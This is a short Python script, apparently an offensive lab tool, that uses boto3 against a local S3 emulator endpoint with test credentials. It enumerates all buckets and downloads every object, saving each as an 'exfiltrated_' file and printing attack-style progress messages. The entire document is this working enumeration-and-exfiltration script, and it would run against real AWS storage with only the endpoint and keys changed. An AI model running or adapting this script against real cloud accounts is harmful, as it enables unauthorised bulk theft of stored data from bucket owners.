#!/usr/bin/env python3
import boto3
from botocore.exceptions import ClientError

s3 = boto3.client('s3', endpoint_url='http://localhost:4566', aws_access_key_id='test', aws_secret_access_key='test')

def enum_buckets():
    try:
        response = s3.list_buckets()
        return [b['Name'] for b in response['Buckets']]
    except:
        return []

def exfil_data(bucket):
    try:
        objs = s3.list_objects_v2(Bucket=bucket)
        for obj in objs.get('Contents', []):
            key = obj['Key']
            s3.download_file(bucket, key, f"exfiltrated_{key}")
            print(f"[+] Exfiltrated: {key}")
    except ClientError as e:
        print(f"[-] Access denied to {bucket}")

buckets = enum_buckets()
print(f"[+] Discovered buckets: {buckets}")

for bucket in buckets:
    exfil_data(bucket)
